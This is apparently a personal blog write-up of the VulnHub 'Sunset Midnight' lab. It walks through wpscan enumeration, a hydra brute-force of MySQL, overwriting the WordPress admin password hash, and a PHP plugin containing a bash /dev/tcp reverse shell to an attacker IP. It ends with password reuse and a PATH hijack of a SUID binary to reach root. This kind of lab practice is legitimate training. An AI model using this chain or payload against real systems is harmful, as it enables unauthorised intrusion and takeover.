---
layout: post
title: Midnight Girl
date: 19-04-2025
categories: [Basics]
tags: [exfiltration, blind, commandinjection, wget]
image: "https://alternativemagazineonline.co.uk/wp-content/uploads/2023/10/midnight-girl.jpg?w=640"
---

## Intrduction 

> Never walk to night you might see midnight girl, she is around, Grub your gun and mask and lets go.
{: .prompt-tip }
This its the most beautfull lab i have ever seen.

## Scanning phase
![Screenshot From 2025-03-30 07-09-56](https://github.com/user-attachments/assets/6856265c-8450-46fa-816c-285e76d3d2d9)


```
3 open ports 

22, 80, 3389
ssh http mysql
```

## port 80 its wordpress website running
 - enumarating the users using wpscan we get

```
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://sunset-midnight/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://sunset-midnight/wp-json/oembed/1.0/embed?url=http://sunset-midnight/&format=json
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

### I have get the user but cant move more because might take forever to brute force next i can take both brute the user admin and the while continue brute the mysql server

```
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/midnight]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.56.106     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-29 14:22:48
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task
[DATA] attacking mysql://192.168.56.106:3306/
[3306][mysql] host: 192.168.56.106   login: root   password: robert
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-29 14:22:50

```

## Accessing mysql
```
┌──(cyberkid㉿kali)-[/media/cyberkid/DAMN]
└─$ mysql -h 192.168.56.106 -u root -p --ssl=0\n
```

## woooo oi have to change the password because i dont have the time to crack it i might fail to crack it

> Just i have to edit the hash.

## create the password
```
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/midnight]
└─$ php -r "echo password_hash('kiddle', PASSWORD_BCRYPT);"

$2y$12$Vna4bvjVf5yNT/Zp6ZA77eUEZz6BYifYdVBKU0Ar7PPcDjV2gPxwS                                                                                   
```

## Updating the database

```
MariaDB [wordpress_db]> UPDATE wp_users SET user_pass = '$2y$12$Vna4bvjVf5yNT/Zp6ZA77eUEZz6BYifYdVBKU0Ar7PPcDjV2gPxwS' WHERE user_login = 'admin';
```


## Go to the plugin section and add new plugin
![Screenshot From 2025-03-11 12-50-35](https://github.com/user-attachments/assets/f2d1e864-cdb4-440a-bd4f-cd26215332fb)


```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
?>
Then i have to find were the filoe get stored and try to open while listerning in the same time
```
![Screenshot From 2025-03-11 19-43-58](https://github.com/user-attachments/assets/1f51aca8-dfc4-4bd0-801a-f1c25d6dbf67)


## save and add new installtion and the upload i6t to get installed 
To find the location of the uploads of the which the uploaded file will be found

```
http://sunset-midnight/wp-content/uploads/

>>> see the current year and dayte then the date will frovide you whilke listerning in the otherside click the php file woow we are in reverse shel;l is open now

nc -lnvp <port>


```

## Lateral movement
Try to see if the database i can find any credentials and try to move laterally

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'jose' );

/** MySQL database password */
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '9F#)Pk/=&SyQ/>UVRBXx$}e&>G@(+m6L|_{Emur&fv&fO_+wbJ`-6QnE_7hI|Y<p');
define('SECURE_AUTH_KEY',  'p#Eh5#4W~p4-Iue2M)H/?[dp`BS;$7o~Kb%F?&S-Zv=rH#;U%`9G#VR`l^,8j$M+');
define('LOGGED_IN_KEY',    '0{YUw?X%j+ej-0du&FW@QkVP?b(#QsQfu[Q%<QS_Lpc1UI1|st:EJr)d*$g/iJ18');
define('NONCE_KEY',        '%)thH*l;)A^S#8WQ!8TKAnQ;uNXNKv<f.|PyYijgztda70y-4m~DTyqr^X!$JwX#');
define('AUTH_SALT',        '<Kd5.3^|yo:/fw2Y|PTb4!bU~5uRv7Z(n0;~jOXoO7MC]j/ICu[tY!)g4Oah-{oa');
define('SECURE_AUTH_SALT', 'dmYQvQ1Ap&z~JUHUaKR6]<rm7^ydGAp(/EH&+vrAi6cBpi?F7XKTc@Ahm:|h*wR;');
define('LOGGED_IN_SALT',   '5+Iw-;-j+2rD3WgRtSM`!zDb5I%LLU0]Awk-Cma:f4xrJv%k~/@+TthXY_[JpjfK');
define('NONCE_SALT',       'iDo3}y9z;@c~a)ZLT:7|.ZCp-0sK4>T1p&%MhGt_TUu+HFpPjn-no`:8sI0BA);y');
```


## Lateral movement i have seen in the credentials in DB i can see if the password is the same and move in as jose
```
/** MySQL database password */
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );

www-data@midnight:/home/jose$ su jose
su jose
Password: 645dc5a8871d2a4269d4cbe23f6ae103
ls
user.txt
whoami
jose


```



## PRIVILAGE ESCALATION
>>> Using lin enum finding for SUID files
```
[-] SUID files:
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-sr-x 1 root root 16768 Jul 18  2020 /usr/bin/status
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
```

## The interesting file.

>>> -rwsr-sr-x 1 root root 16768 Jul 18  2020 /usr/bin/status

I created service file in tmp then i add /bin/bash inside the file to make it worth with bash shell

## Finally am Root.

```
jose@midnight:/usr/bin$ ls -al |grep status;
-rwsr-sr-x  1 root root       16768 Jul 18  2020 status
jose@midnight:/usr/bin$ ./status
sh: 1: service: not found
Status of the SSH server:jose@midnight:/usr/bin$ jose@midnight:/tmp$ export PATH=/tmp:$PATH
jose@midnight:/tmp$ /usr/bin/status
# whoami
root
# 
```

> Continue moving kid
{: .prompt-tip }
